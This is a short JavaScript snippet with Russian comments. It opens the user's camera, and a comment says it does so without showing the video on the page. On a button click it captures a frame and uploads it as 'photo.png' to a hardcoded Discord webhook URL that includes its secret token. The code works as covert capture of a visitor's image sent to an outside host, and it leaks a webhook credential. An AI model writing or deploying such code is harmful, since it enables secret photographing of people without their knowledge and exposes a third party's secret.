const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureButton = document.getElementById('capture');

// Получаем доступ к камере без отображения видео на странице
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
  })
  .catch(err => {
    console.error('Ошибка доступа к камере: ', err);
  });

captureButton.addEventListener('click', () => {
  const context = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  
  // Рисуем изображение с видео на канвас
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  // Преобразуем канвас в изображение и отправляем
  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append('file', blob, 'photo.png');
    
    // Отправляем изображение через запрос
    fetch('https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      if (response.ok) {
        console.log('Фото успешно отправлено');
      } else {
        console.error('Ошибка при отправке фото');
      }
    })
    .catch(err => {
      console.error('Ошибка при отправке запроса: ', err);
    });
  }, 'image/png');
});
